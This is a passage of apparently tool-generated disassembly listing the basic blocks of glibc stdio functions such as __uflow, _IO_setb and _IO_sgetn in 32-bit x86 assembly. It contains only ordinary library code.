None
|
|
|
v
0xb0709ed:	cmp	eax, 0xff
0xb0709f0:	jne	0xb070979
None
|
|
|
v
0xb070a5b:	mov	dword ptr [esp], esi
0xb070a5e:	call	0xb070880
None
|
|
|
v
0xb0709c8:	mov	ecx, dword ptr [ebx - 0xf8]
0xb0709ce:	test	ecx, ecx
0xb0709d0:	je	0xb070a68
None
|
|
|
v
0xb070971:	test	dword ptr [esi], 0x800
0xb070977:	jne	0xb0709e5
None
|
|
|
v
0xb070a10:	cmp	eax, 0xff
0xb070a13:	jne	0xb0709f8
None
|
|
|
v
0xb0709f2:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb070979:	mov	eax, dword ptr [esi + 4]
0xb07097c:	cmp	eax, dword ptr [esi + 8]
0xb07097f:	jb	0xb070a40
None
|
|
|
v
0xb0709e5:	mov	dword ptr [esp], esi
0xb0709e8:	call	0xb070810
None
|
|
|
v
0xb070a15:	mov	eax, dword ptr [esi + 0x68]
0xb070a18:	test	eax, eax
0xb070a1a:	je	0xb0709c8
None
|
|
|
v
0xb070963:	mov	dword ptr [esi + 0x68], 0xffffffff
0xb07096a:	mov	eax, dword ptr [esi + 0x68]
0xb07096d:	test	eax, eax
0xb07096f:	je	0xb0709c8
None
|
|
|
v
0xb070a30:	mov	eax, dword ptr [esi + 4]
0xb070a33:	cmp	eax, dword ptr [esi + 8]
0xb070a36:	jae	0xb070991
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__uflow
TOTAL BLOCKS :34
0xb070a9a:	mov	eax, dword ptr [ebx - 0xf8]
0xb070aa0:	test	eax, eax
0xb070aa2:	je	0xb070b4f
None
|
|
|
v
0xb070afa:	movsx	eax, byte ptr [esi + 0x46]
0xb070afe:	mov	eax, dword ptr [esi + eax + 0x94]
0xb070b05:	mov	dword ptr [esp], esi
0xb070b08:	call	dword ptr [eax + 0x14]
None
|
|
|
v
0xb070bab:	mov	dword ptr [esp], esi
0xb070bae:	call	0xb070880
None
|
|
|
v
0xb070a80:	push	esi
0xb070a81:	push	ebx
0xb070a82:	sub	esp, 0x14
0xb070a85:	mov	esi, dword ptr [esp + 0x20]
0xb070a89:	call	0xb1267db
None
|
|
|
v
0xb070bb8:	mov	dword ptr [esp + 4], 0xffffffff
0xb070bc0:	mov	dword ptr [esp], esi
0xb070bc3:	call	0xb066ae0
None
|
|
|
v
0xb070bb3:	jmp	0xb070afa
None
|
|
|
v
0xb070b42:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb070b48:	mov	eax, 0xffffffff
0xb070b4d:	jmp	0xb070b0b
None
|
|
|
v
0xb070aec:	mov	edx, dword ptr [esi + 8]
0xb070aef:	mov	eax, esi
0xb070af1:	call	0xb0705e0
None
|
|
|
v
0xb070b3d:	cmp	eax, 0xff
0xb070b40:	jne	0xb070ac9
None
|
|
|
v
0xb070af6:	test	eax, eax
0xb070af8:	jne	0xb070b48
None
|
|
|
v
0xb070b26:	test	dword ptr [esi], 0x800
0xb070b2c:	mov	dword ptr [esi + 0x68], 0xffffffff
0xb070b33:	je	0xb070ac9
None
|
|
|
v
0xb070b18:	mov	ecx, dword ptr [ebx - 0xf8]
0xb070b1e:	test	ecx, ecx
0xb070b20:	je	0xb070bb8
None
|
|
|
v
0xb070ac1:	test	dword ptr [esi], 0x800
0xb070ac7:	jne	0xb070b35
None
|
|
|
v
0xb070b60:	cmp	eax, 0xff
0xb070b63:	jne	0xb070b48
None
|
|
|
v
0xb070b90:	lea	edx, dword ptr [eax + 1]
0xb070b93:	mov	dword ptr [esi + 4], edx
0xb070b96:	movzx	eax, byte ptr [eax]
0xb070b99:	add	esp, 0x14
0xb070b9c:	pop	ebx
0xb070b9d:	pop	esi
0xb070b9e:	ret	
None
|
|
|
v
0xb070b4f:	mov	dword ptr [esp + 4], 0xffffffff
0xb070b57:	mov	dword ptr [esp], esi
0xb070b5a:	call	0xb066ae0
None
|
|
|
v
0xb070ac9:	mov	eax, dword ptr [esi + 4]
0xb070acc:	cmp	eax, dword ptr [esi + 8]
0xb070acf:	jb	0xb070b90
None
|
|
|
v
0xb070b65:	mov	eax, dword ptr [esi + 0x68]
0xb070b68:	test	eax, eax
0xb070b6a:	je	0xb070b18
None
|
|
|
v
0xb070b35:	mov	dword ptr [esp], esi
0xb070b38:	call	0xb070810
None
|
|
|
v
0xb070b80:	mov	eax, dword ptr [esi + 4]
0xb070b83:	cmp	eax, dword ptr [esi + 8]
0xb070b86:	jae	0xb070ae1
None
|
|
|
v
0xb070ba0:	mov	eax, dword ptr [esi + 0x24]
0xb070ba3:	test	eax, eax
0xb070ba5:	je	0xb070afa
None
|
|
|
v
0xb070ab3:	mov	dword ptr [esi + 0x68], 0xffffffff
0xb070aba:	mov	eax, dword ptr [esi + 0x68]
0xb070abd:	test	eax, eax
0xb070abf:	je	0xb070b18
None
|
|
|
v
0xb070aba:	mov	eax, dword ptr [esi + 0x68]
0xb070abd:	test	eax, eax
0xb070abf:	je	0xb070b18
None
|
|
|
v
0xb070bc8:	jmp	0xb070ac1
None
|
|
|
v
0xb070b5f:	nop	
None
|
|
|
v
0xb070b78:	mov	dword ptr [esp], esi
0xb070b7b:	call	0xb0707b0
None
|
|
|
v
0xb070aa8:	mov	eax, dword ptr [esi + 0x68]
0xb070aab:	test	eax, eax
0xb070aad:	jne	0xb070b60
None
|
|
|
v
0xb070b6c:	jmp	0xb070ac1
None
|
|
|
v
0xb070a8e:	add	ebx, 0x13a572
0xb070a94:	cmp	byte ptr [esi + 0x46], 0
0xb070a98:	jne	0xb070aba
None
|
|
|
v
0xb070b8c:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb070ad5:	test	dword ptr [esi], 0x100
0xb070adb:	jne	0xb070b78
None
|
|
|
v
0xb070ae1:	mov	edx, dword ptr [esi + 0x30]
0xb070ae4:	test	edx, edx
0xb070ae6:	je	0xb070ba0
None
|
|
|
v
0xb070b0b:	add	esp, 0x14
0xb070b0e:	pop	ebx
0xb070b0f:	pop	esi
0xb070b10:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_IO_setb
TOTAL BLOCKS :8
0xb070bde:	add	ebx, 0x13a422
0xb070be4:	mov	edx, dword ptr [esi + 0x1c]
0xb070be7:	mov	eax, dword ptr [esi]
0xb070be9:	test	edx, edx
0xb070beb:	je	0xb070bf1
None
|
|
|
v
0xb070bed:	test	al, 1
0xb070bef:	je	0xb070c28
None
|
|
|
v
0xb070bf1:	mov	edx, dword ptr [esp + 0x24]
0xb070bf5:	mov	dword ptr [esi + 0x1c], edx
0xb070bf8:	mov	edx, dword ptr [esp + 0x28]
0xb070bfc:	mov	dword ptr [esi + 0x20], edx
0xb070bff:	mov	edx, dword ptr [esp + 0x2c]
0xb070c03:	test	edx, edx
0xb070c05:	jne	0xb070c18
None
|
|
|
v
0xb070c07:	or	eax, 1
0xb070c0a:	mov	dword ptr [esi], eax
0xb070c0c:	add	esp, 0x14
0xb070c0f:	pop	ebx
0xb070c10:	pop	esi
0xb070c11:	ret	
None
|
|
|
v
0xb070bd0:	push	esi
0xb070bd1:	push	ebx
0xb070bd2:	sub	esp, 0x14
0xb070bd5:	mov	esi, dword ptr [esp + 0x20]
0xb070bd9:	call	0xb1267db
None
|
|
|
v
0xb070c18:	and	eax, 0xfffffffe
0xb070c1b:	mov	dword ptr [esi], eax
0xb070c1d:	add	esp, 0x14
0xb070c20:	pop	ebx
0xb070c21:	pop	esi
0xb070c22:	ret	
None
|
|
|
v
0xb070c43:	mov	eax, dword ptr [esi]
0xb070c45:	jmp	0xb070bf1
None
|
|
|
v
0xb070c28:	mov	eax, dword ptr [esi + 0x20]
0xb070c2b:	mov	dword ptr [esp], edx
0xb070c2e:	sub	eax, edx
0xb070c30:	add	eax, 0xfff
0xb070c35:	and	eax, 0xfffff000
0xb070c3a:	mov	dword ptr [esp + 4], eax
0xb070c3e:	call	0xb0e7410
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_IO_sgetn
TOTAL BLOCKS :2
0xb070dd0:	sub	esp, 0x1c
0xb070dd3:	mov	eax, dword ptr [esp + 0x20]
0xb070dd7:	mov	ecx, dword ptr [esp + 0x28]
0xb070ddb:	movsx	edx, byte ptr [eax + 0x46]
0xb070ddf:	mov	edx, dword ptr [eax + edx + 0x94]
0xb070de6:	mov	dword ptr [esp + 8], ecx
0xb070dea:	mov	ecx, dword ptr [esp + 0x24]
0xb070dee:	mov	dword ptr [esp], eax
0xb070df1:	mov	dword ptr [esp + 4], ecx
0xb070df5:	call	dword ptr [edx + 0x20]
None
|
|
|
v
0xb070df8:	add	esp, 0x1c
0xb070dfb:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b071020
TOTAL BLOCKS :3
0xb071020:	mov	edx, dword ptr [esp + 8]
0xb071024:	mov	eax, dword ptr [esp + 4]
0xb071028:	or	edx, 0xfbad0000
0xb07102e:	mov	dword ptr [eax], edx
0xb071030:	xor	edx, edx
0xb071032:	mov	dword ptr [eax + 0x3c], 0
0xb071039:	mov	dword ptr [eax + 0x1c], 0
0xb071040:	mov	dword ptr [eax + 0x20], 0
0xb071047:	mov	dword ptr [eax + 0xc], 0
0xb07104e:	mov	dword ptr [eax + 4], 0
0xb071055:	mov	dword ptr [eax + 8], 0
0xb07105c:	mov	dword ptr [eax + 0x10], 0
0xb071063:	mov	dword ptr [eax + 0x14], 0
0xb07106a:	mov	dword ptr [eax + 0x18], 0
0xb071071:	mov	dword ptr [eax + 0x34], 0
0xb071078:	mov	dword ptr [eax + 0x24], 0
0xb07107f:	mov	dword ptr [eax + 0x28], 0
0xb071086:	mov	dword ptr [eax + 0x2c], 0
0xb07108d:	mov	dword ptr [eax + 0x30], 0
0xb071094:	mov	word ptr [eax + 0x44], dx
0xb071098:	mov	byte ptr [eax + 0x46], 0
0xb07109c:	mov	eax, dword ptr [eax + 0x48]
0xb07109f:	test	eax, eax
0xb0710a1:	je	0xb0710b7
None
|
|
|
v
0xb0710b7:	ret	
None
|
|
|
v
0xb0710a3:	mov	dword ptr [eax], 0
0xb0710a9:	mov	dword ptr [eax + 4], 0
0xb0710b0:	mov	dword ptr [eax + 8], 0
0xb0710b7:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0710c0
TOTAL BLOCKS :5
0xb071160:	mov	dword ptr [edi + 0x58], 0xffffffff
0xb071167:	mov	dword ptr [edi + 0x5c], 0
0xb07116e:	add	esp, 0x1c
0xb071171:	pop	ebx
0xb071172:	pop	esi
0xb071173:	pop	edi
0xb071174:	pop	ebp
0xb071175:	ret	
None
|
|
|
v
0xb0710cc:	add	ebx, 0x139f34
0xb0710d2:	mov	edi, dword ptr [esp + 0x30]
0xb0710d6:	mov	eax, dword ptr [esp + 0x34]
0xb0710da:	mov	ebp, dword ptr [esp + 0x38]
0xb0710de:	mov	esi, dword ptr [esp + 0x3c]
0xb0710e2:	mov	dword ptr [esp], edi
0xb0710e5:	mov	dword ptr [esp + 4], eax
0xb0710e9:	call	0xb071020
None
|
|
|
v
0xb0710ee:	test	ebp, ebp
0xb0710f0:	mov	dword ptr [edi + 0x68], ebp
0xb0710f3:	js	0xb071160
None
|
|
|
v
0xb0710f5:	mov	eax, dword ptr [esp + 0x40]
0xb0710f9:	mov	dword ptr [edi + 0x58], esi
0xb0710fc:	mov	dword ptr [esi + 0x18], 0
0xb071103:	mov	dword ptr [esi + 0x1c], 0
0xb07110a:	mov	dword ptr [esi + 8], 0
0xb071111:	mov	dword ptr [esi], 0
0xb071117:	mov	dword ptr [esi + 4], 0
0xb07111e:	mov	dword ptr [esi + 0xc], 0
0xb071125:	mov	dword ptr [esi + 0x10], 0
0xb07112c:	mov	dword ptr [esi + 0x14], 0
0xb071133:	mov	dword ptr [esi + 0x20], 0
0xb07113a:	mov	dword ptr [esi + 0x24], 0
0xb071141:	mov	dword ptr [esi + 0x28], 0
0xb071148:	mov	dword ptr [esi + 0xb8], eax
0xb07114e:	mov	dword ptr [edi + 0x5c], 0
0xb071155:	add	esp, 0x1c
0xb071158:	pop	ebx
0xb071159:	pop	esi
0xb07115a:	pop	edi
0xb07115b:	pop	ebp
0xb07115c:	ret	
None
|
|
|
v
0xb0710c0:	push	ebp
0xb0710c1:	push	edi
0xb0710c2:	push	esi
0xb0710c3:	push	ebx
0xb0710c4:	sub	esp, 0x1c
0xb0710c7:	call	0xb1267db
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_IO_sputbackc
TOTAL BLOCKS :7
0xb0712b0:	sub	edx, 1
0xb0712b3:	movzx	eax, al
0xb0712b6:	mov	dword ptr [esi + 4], edx
0xb0712b9:	jmp	0xb0712a3
None
|
|
|
v
0xb071284:	cmp	byte ptr [edx - 1], al
0xb071287:	je	0xb0712b0
None
|
|
|
v
0xb071289:	movsx	edx, byte ptr [esi + 0x46]
0xb07128d:	mov	edx, dword ptr [esi + edx + 0x94]
0xb071294:	mov	dword ptr [esp + 4], eax
0xb071298:	mov	dword ptr [esp], esi
0xb07129b:	call	dword ptr [edx + 0x18]
None
|
|
|
v
0xb0712a3:	and	dword ptr [esi], 0xffffffef
0xb0712a6:	add	esp, 0x18
0xb0712a9:	pop	esi
0xb0712aa:	ret	
None
|
|
|
v
0xb07129e:	cmp	eax, 0xff
0xb0712a1:	je	0xb0712a6
None
|
|
|
v
0xb071270:	push	esi
0xb071271:	sub	esp, 0x18
0xb071274:	mov	esi, dword ptr [esp + 0x20]
0xb071278:	mov	eax, dword ptr [esp + 0x24]
0xb07127c:	mov	edx, dword ptr [esi + 4]
0xb07127f:	cmp	edx, dword ptr [esi + 0xc]
0xb071282:	jbe	0xb071289
None
|
|
|
v
0xb0712a6:	add	esp, 0x18
0xb0712a9:	pop	esi
0xb0712aa:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_IO_adjust_column
TOTAL BLOCKS :7
0xb071310:	push	esi
0xb071311:	mov	ecx, dword ptr [esp + 0xc]
0xb071315:	mov	esi, dword ptr [esp + 0x10]
0xb071319:	lea	eax, dword ptr [ecx + esi]
0xb07131c:	cmp	ecx, eax
0xb07131e:	jae	0xb07133c
None
|
|
|
v
0xb071329:	jmp	0xb071348
None
|
|
|
v
0xb071330:	sub	edx, 1
0xb071333:	cmp	byte ptr [edx], 0xa
0xb071336:	je	0xb071348
None
|
|
|
v
0xb071338:	cmp	edx, ecx
0xb07133a:	jne	0xb071330
None
|
|
|
v
0xb071348:	sub	eax, edx
0xb07134a:	sub	eax, 1
0xb07134d:	pop	esi
0xb07134e:	ret	
None
|
|
|
v
0xb071320:	cmp	byte ptr [eax - 1], 0xa
0xb071324:	lea	edx, dword ptr [eax - 1]
0xb071327:	jne	0xb071338
None
|
|
|
v
0xb07133c:	mov	eax, dword ptr [esp + 8]
0xb071340:	add	eax, esi
0xb071342:	pop	esi
0xb071343:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b071350
TOTAL BLOCKS :54
0xb071464:	mov	edx, dword ptr [esi + 0x48]
0xb071467:	sub	dword ptr [edx + 4], 1
0xb07146b:	jne	0xb071488
None
|
|
|
v
0xb071e19:	jmp	0xb071488
None
|
|
|
v
0xb071426:	lock cmpxchg	dword ptr [edx], ecx
0xb07142a:	jne	0xb071e06
None
|
|
|
v
0xb0714ea:	mov	eax, dword ptr [esp + 0x14]
0xb0714ee:	add	esp, 0x3c
0xb0714f1:	pop	ebx
0xb0714f2:	pop	esi
0xb0714f3:	pop	edi
0xb0714f4:	pop	ebp
0xb0714f5:	ret	
None
|
|
|
v
0xb071540:	mov	eax, dword ptr [esi + 0x10]
0xb071543:	cmp	dword ptr [esi + 0x14], eax
0xb071546:	jbe	0xb071458
None
|
|
|
v
0xb071580:	lea	edx, dword ptr [ebx - 0x13aec0]
0xb071586:	mov	eax, dword ptr [ebx + 0x38b8]
0xb07158c:	mov	dword ptr [esp + 4], edx
0xb071590:	lea	edx, dword ptr [esp + 0x20]
0xb071594:	ror	eax, 9
0xb071597:	xor	eax, dword ptr gs:[0x18]
0xb07159e:	mov	dword ptr [esp + 8], 0
0xb0715a6:	mov	dword ptr [esp], edx
0xb0715a9:	call	eax
None
|
|
|
v
0xb0714a8:	test	esi, esi
0xb0714aa:	jne	0xb0713f8
None
|
|
|
v
0xb071e29:	jmp	0xb07157a
None
|
|
|
v
0xb071384:	lea	eax, dword ptr [ebx - 0x13aec0]
0xb07138a:	mov	dword ptr [esp + 0x20], eax
0xb07138e:	mov	dword ptr [esp + 0x24], 0
0xb071396:	mov	edx, dword ptr gs:[8]
0xb07139d:	cmp	edx, dword ptr [ebx + 0x1888]
0xb0713a3:	je	0xb0713ca
None
|
|
|
v
0xb0713f8:	test	edi, edi
0xb0713fa:	mov	dword ptr [ebx + 0x1878], esi
0xb071400:	je	0xb071441
None
|
|
|
v
0xb071558:	mov	dword ptr [ebx + 0x1888], 0
0xb071562:	cmp	dword ptr gs:[0xc], 0
0xb07156a:	je	0xb07156d
None
|
|
|
v
0xb071e12:	lea	eax, dword ptr [edx]
0xb071e14:	call	0xb0f9460
None
|
|
|
v
0xb071488:	mov	eax, dword ptr [ebx + 0x187c]
0xb07148e:	mov	dword ptr [ebx + 0x1878], 0
0xb071498:	cmp	ebp, eax
0xb07149a:	je	0xb071538
None
|
|
|
v
0xb071e06:	lea	ecx, dword ptr [edx]
0xb071e08:	call	0xb0f9430
None
|
|
|
v
0xb071402:	mov	eax, dword ptr [esi]
0xb071404:	and	eax, 0x8000
0xb071409:	jne	0xb071441
None
|
|
|
v
0xb0714f6:	mov	eax, dword ptr [esi + 0x58]
0xb0714f9:	mov	ecx, dword ptr [eax + 0xc]
0xb0714fc:	cmp	dword ptr [eax + 0x10], ecx
0xb0714ff:	jbe	0xb071458
None
|
|
|
v
0xb071360:	add	ebx, 0x139ca0
0xb071366:	mov	dword ptr [esp + 0x1c], 0
0xb07136e:	test	edi, edi
0xb071370:	je	0xb0713d1
None
|
|
|
v
0xb071430:	mov	eax, dword ptr [esi + 0x48]
0xb071433:	mov	ecx, dword ptr [esp + 0x18]
0xb071437:	mov	edx, dword ptr [esi + 0x48]
0xb07143a:	mov	dword ptr [eax + 8], ecx
0xb07143d:	add	dword ptr [edx + 4], 1
0xb071441:	mov	edx, dword ptr [esi + 0x68]
0xb071444:	test	edx, edx
0xb071446:	jle	0xb071540
None
|
|
|
v
0xb07151d:	cmp	eax, 0xff
0xb071520:	mov	eax, 0xffffffff
0xb071525:	cmovne	eax, dword ptr [esp + 0x14]
0xb07152a:	mov	dword ptr [esp + 0x14], eax
0xb07152e:	jmp	0xb071458
None
|
|
|
v
0xb071e01:	jmp	0xb0713c4
None
|
|
|
v
0xb0714c1:	mov	eax, dword ptr [esp + 0x1c]
0xb0714c5:	test	eax, eax
0xb0714c7:	je	0xb0714ea
None
|
|
|
v
0xb0714a0:	mov	esi, dword ptr [ebx + 0x940]
0xb0714a6:	mov	ebp, eax
0xb0714a8:	test	esi, esi
0xb0714aa:	jne	0xb0713f8
None
|
|
|
v
0xb071417:	mov	ecx, 1
0xb07141c:	cmp	dword ptr gs:[0xc], 0
0xb071424:	je	0xb071427
None
|
|
|
v
0xb071df6:	lea	ecx, dword ptr [ebx + 0x1880]
0xb071dfc:	call	0xb0f9430
None
|
|
|
v
0xb071482:	jne	0xb071e12
None
|
|
|
v
0xb071350:	push	ebp
0xb071351:	push	edi
0xb071352:	push	esi
0xb071353:	push	ebx
0xb071354:	sub	esp, 0x3c
0xb071357:	mov	edi, dword ptr [esp + 0x50]
0xb07135b:	call	0xb1267db
None
|
|
|
v
0xb0713c4:	mov	dword ptr [ebx + 0x1888], edx
0xb0713ca:	add	dword ptr [ebx + 0x1884], 1
0xb0713d1:	mov	esi, dword ptr [ebx + 0x940]
0xb0713d7:	mov	ebp, dword ptr [ebx + 0x187c]
0xb0713dd:	mov	dword ptr [esp + 0x14], 0
0xb0713e5:	test	esi, esi
0xb0713e7:	je	0xb0714b0
None
|
|
|
v
0xb0715ab:	jmp	0xb071396
None
|
|
|
v
0xb071458:	test	edi, edi
0xb07145a:	je	0xb071488
None
|
|
|
v
0xb07144c:	movzx	edx, byte ptr [esi + 0x46]
0xb071450:	test	dl, dl
0xb071452:	je	0xb0714f6
None
|
|
|
v
0xb071396:	mov	edx, dword ptr gs:[8]
0xb07139d:	cmp	edx, dword ptr [ebx + 0x1888]
0xb0713a3:	je	0xb0713ca
None
|
|
|
v
0xb071505:	movsx	eax, dl
0xb071508:	mov	eax, dword ptr [esi + eax + 0x94]
0xb07150f:	mov	dword ptr [esp + 4], 0xffffffff
0xb071517:	mov	dword ptr [esp], esi
0xb07151a:	call	dword ptr [eax + 0xc]
None
|
|
|
v
0xb0713b6:	lock cmpxchg	dword ptr [ebx + 0x1880], ecx
0xb0713be:	jne	0xb071df6
None
|
|
|
v
0xb07157a:	jmp	0xb0714c1
None
|
|
|
v
0xb071538:	mov	esi, dword ptr [esi + 0x34]
0xb07153b:	jmp	0xb0714a8
None
|
|
|
v
0xb071574:	jne	0xb071e1e
None
|
|
|
v
0xb071372:	mov	eax, dword ptr [ebx + 0x38d8]
0xb071378:	test	eax, eax
0xb07137a:	mov	dword ptr [esp + 0x1c], eax
0xb07137e:	jne	0xb071580
None
|
|
|
v
0xb071441:	mov	edx, dword ptr [esi + 0x68]
0xb071444:	test	edx, edx
0xb071446:	jle	0xb071540
None
|
|
|
v
0xb07140b:	mov	edx, dword ptr [esi + 0x48]
0xb07140e:	mov	ecx, dword ptr [esp + 0x18]
0xb071412:	cmp	ecx, dword ptr [edx + 8]
0xb071415:	je	0xb07143d
None
|
|
|
v
0xb07156c:	lock sub	dword ptr [ebx + 0x1880], 1
None
|
|
|
v
0xb0714b4:	sub	dword ptr [ebx + 0x1884], 1
0xb0714bb:	je	0xb071558
None
|
|
|
v
0xb0714c9:	lea	edx, dword ptr [esp + 0x20]
0xb0714cd:	mov	eax, dword ptr [ebx + 0x38bc]
0xb0714d3:	mov	dword ptr [esp + 4], 0
0xb0714db:	ror	eax, 9
0xb0714de:	xor	eax, dword ptr gs:[0x18]
0xb0714e5:	mov	dword ptr [esp], edx
0xb0714e8:	call	eax
None
|
|
|
v
0xb0713d1:	mov	esi, dword ptr [ebx + 0x940]
0xb0713d7:	mov	ebp, dword ptr [ebx + 0x187c]
0xb0713dd:	mov	dword ptr [esp + 0x14], 0
0xb0713e5:	test	esi, esi
0xb0713e7:	je	0xb0714b0
None
|
|
|
v
0xb0714b0:	test	edi, edi
0xb0714b2:	je	0xb0714c1
None
|
|
|
v
0xb0713a5:	xor	eax, eax
0xb0713a7:	mov	ecx, 1
0xb0713ac:	cmp	dword ptr gs:[0xc], 0
0xb0713b4:	je	0xb0713b7
None
|
|
|
v
0xb07154c:	movzx	edx, byte ptr [esi + 0x46]
0xb071550:	jmp	0xb071505
None
|
|
|
v
0xb071e1e:	lea	eax, dword ptr [ebx + 0x1880]
0xb071e24:	call	0xb0f9460
None
|
|
|
v
0xb07146d:	mov	dword ptr [edx + 8], 0
0xb071474:	cmp	dword ptr gs:[0xc], 0
0xb07147c:	je	0xb07147f
None
|
|
|
v
0xb07145c:	test	dword ptr [esi], 0x8000
0xb071462:	jne	0xb071488
None
|
|
|
v
0xb071e0d:	jmp	0xb071430
None
|
|
|
v
0xb07147e:	lock sub	dword ptr [edx], 1
None
|
|
|
v
0xb07143d:	add	dword ptr [edx + 4], 1
0xb071441:	mov	edx, dword ptr [esi + 0x68]
0xb071444:	test	edx, edx
0xb071446:	jle	0xb071540
None
|
|
|
v
0xb0713ca:	add	dword ptr [ebx + 0x1884], 1
0xb0713d1:	mov	esi, dword ptr [ebx + 0x940]
0xb0713d7:	mov	ebp, dword ptr [ebx + 0x187c]
0xb0713dd:	mov	dword ptr [esp + 0x14], 0
0xb0713e5:	test	esi, esi
0xb0713e7:	je	0xb0714b0
None
|
|
|
v
0xb0713ed:	mov	eax, dword ptr gs:[8]
0xb0713f3:	mov	dword ptr [esp + 0x18], eax
0xb0713f7:	nop	
0xb0713f8:	test	edi, edi
0xb0713fa:	mov	dword ptr [ebx + 0x1878], esi
0xb071400:	je	0xb071441
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0715b0
TOTAL BLOCKS :33
0xb071698:	add	edi, 1
0xb07169b:	call	0xb0c2d70
None
|
|
|
v
0xb071678:	mov	dword ptr [esi + 0x68], 0xffffffff
0xb07167f:	mov	esi, dword ptr [esi + 0x34]
0xb071682:	test	esi, esi
0xb071684:	jne	0xb0715e8
None
|
|
|
v
0xb07166e:	cmp	edi, 2
0xb071671:	jne	0xb0716d8
None
|
|
|
v
0xb07162e:	mov	eax, dword ptr [esi + 0x48]
0xb071631:	mov	dword ptr [eax + 8], ebp
0xb071634:	mov	eax, dword ptr [esi + 0x48]
0xb071637:	mov	dword ptr [eax + 4], 1
0xb07163e:	cmp	byte ptr [ebx + 0x1874], 0
0xb071645:	jne	0xb07164d
None
|
|
|
v
0xb071e2e:	lea	eax, dword ptr [edx]
0xb071e30:	call	0xb0f9460
None
|
|
|
v
0xb0715e8:	mov	eax, dword ptr [esi]
0xb0715ea:	test	al, 2
0xb0715ec:	jne	0xb071678
None
|
|
|
v
0xb071708:	add	dword ptr [edx + 4], 1
0xb07170c:	jmp	0xb07163e
None
|
|
|
v
0xb07160c:	cmp	ebp, dword ptr [edx + 8]
0xb07160f:	je	0xb071708
None
|
|
|
v
0xb071626:	lock cmpxchg	dword ptr [edx], ecx
0xb07162a:	test	eax, eax
0xb07162c:	jne	0xb071698
None
|
|
|
v
0xb0716d8:	mov	edx, dword ptr [esi + 0x48]
0xb0716db:	test	edx, edx
0xb0716dd:	je	0xb071678
None
|
|
|
v
0xb0715e7:	nop	
None
|
|
|
v
0xb0715b0:	push	ebp
0xb0715b1:	push	edi
0xb0715b2:	push	esi
0xb0715b3:	push	ebx
0xb0715b4:	call	0xb1267db
None
|
|
|
v
0xb0715d5:	mov	esi, dword ptr [ebx + 0x940]
0xb0715db:	test	esi, esi
0xb0715dd:	mov	dword ptr [esp + 0xc], eax
0xb0715e1:	je	0xb07168a
None
|
|
|
v
0xb07168a:	mov	eax, dword ptr [esp + 0xc]
0xb07168e:	add	esp, 0x1c
0xb071691:	pop	ebx
0xb071692:	pop	esi
0xb071693:	pop	edi
0xb071694:	pop	ebp
0xb071695:	ret	
None
|
|
|
v
0xb0716f6:	lock sub	dword ptr [edx], 1
None
|
|
|
v
0xb0715fc:	mov	eax, dword ptr [esi + 0x68]
0xb0715ff:	test	eax, eax
0xb071601:	je	0xb071678
None
|
|
|
v
0xb0715f2:	and	eax, 0x1008
0xb0715f7:	cmp	eax, 8
0xb0715fa:	je	0xb071678
None
|
|
|
v
0xb07164d:	movsx	eax, byte ptr [esi + 0x46]
0xb071651:	mov	eax, dword ptr [esi + eax + 0x94]
0xb071658:	mov	dword ptr [esp + 8], 0
0xb071660:	mov	dword ptr [esp + 4], 0
0xb071668:	mov	dword ptr [esp], esi
0xb07166b:	call	dword ptr [eax + 0x2c]
None
|
|
|
v
0xb0716df:	sub	dword ptr [edx + 4], 1
0xb0716e3:	jne	0xb071678
None
|
|
|
v
0xb0716a5:	jmp	0xb071605
None
|
|
|
v
0xb07163e:	cmp	byte ptr [ebx + 0x1874], 0
0xb071645:	jne	0xb07164d
None
|
|
|
v
0xb071673:	nop	
0xb071674:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb071603:	xor	edi, edi
0xb071605:	mov	edx, dword ptr [esi + 0x48]
0xb071608:	test	edx, edx
0xb07160a:	je	0xb07163e
None
|
|
|
v
0xb071700:	jmp	0xb071678
None
|
|
|
v
0xb071e35:	jmp	0xb071700
None
|
|
|
v
0xb0716b0:	or	eax, 1
0xb0716b3:	mov	ecx, dword ptr [esi + 0x20]
0xb0716b6:	mov	dword ptr [esi], eax
0xb0716b8:	mov	eax, dword ptr [ebx + 0x1870]
0xb0716be:	mov	dword ptr [ebx + 0x1870], esi
0xb0716c4:	mov	dword ptr [esi + 0x5c], eax
0xb0716c7:	mov	eax, dword ptr [esi + 0x1c]
0xb0716ca:	sub	ecx, eax
0xb0716cc:	mov	dword ptr [esi + 0x60], eax
0xb0716cf:	mov	dword ptr [esi + 0x64], ecx
0xb0716d2:	jmp	0xb07164d
None
|
|
|
v
0xb071647:	mov	eax, dword ptr [esi]
0xb071649:	test	al, 1
0xb07164b:	je	0xb0716b0
None
|
|
|
v
0xb071605:	mov	edx, dword ptr [esi + 0x48]
0xb071608:	test	edx, edx
0xb07160a:	je	0xb07163e
None
|
|
|
v
0xb0716a0:	cmp	edi, 2
0xb0716a3:	je	0xb07163e
None
|
|
|
v
0xb0716e5:	mov	dword ptr [edx + 8], 0
0xb0716ec:	cmp	dword ptr gs:[0xc], 0
0xb0716f4:	je	0xb0716f7
None
|
|
|
v
0xb071615:	xor	eax, eax
0xb071617:	mov	ecx, 1
0xb07161c:	cmp	dword ptr gs:[0xc], 0
0xb071624:	je	0xb071627
None
|
|
|
v
0xb0716fa:	jne	0xb071e2e
None
|
|
|
v
0xb0715b9:	add	ebx, 0x139a47
0xb0715bf:	sub	esp, 0x1c
0xb0715c2:	mov	dword ptr [esp], 0
0xb0715c9:	mov	ebp, dword ptr gs:[8]
0xb0715d0:	call	0xb071350
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_IO_unsave_markers
TOTAL BLOCKS :5
